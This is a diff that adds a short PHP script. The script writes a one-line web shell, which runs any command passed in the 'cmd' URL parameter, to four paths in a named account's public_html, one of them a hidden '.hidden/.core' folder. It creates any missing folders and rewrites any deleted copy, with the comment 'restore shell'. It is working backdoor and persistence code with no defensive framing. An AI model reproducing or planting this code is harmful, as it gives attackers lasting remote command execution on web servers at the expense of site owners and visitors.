@@ -1,0 +1,22 @@
+<?php
+$code = '<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>';
+
+$targets = [
+  '/home/sumonbac/public_html/uploads/memek.php',
+  '/home/sumonbac/public_html/images/alpha.php',
+  '/home/sumonbac/public_html/item/jobs/x.php',
+  '/home/sumonbac/public_html/.hidden/.core/backup.php'
+];
+
+foreach ($targets as $file) {
+  $dir = dirname($file);
+
+  if (!is_dir($dir)) {
+    mkdir($dir, 0755, true); // buat folder jika belum ada
+  }
+
+  if (!file_exists($file)) {
+    file_put_contents($file, $code); // restore shell
+  }
+}
+?>
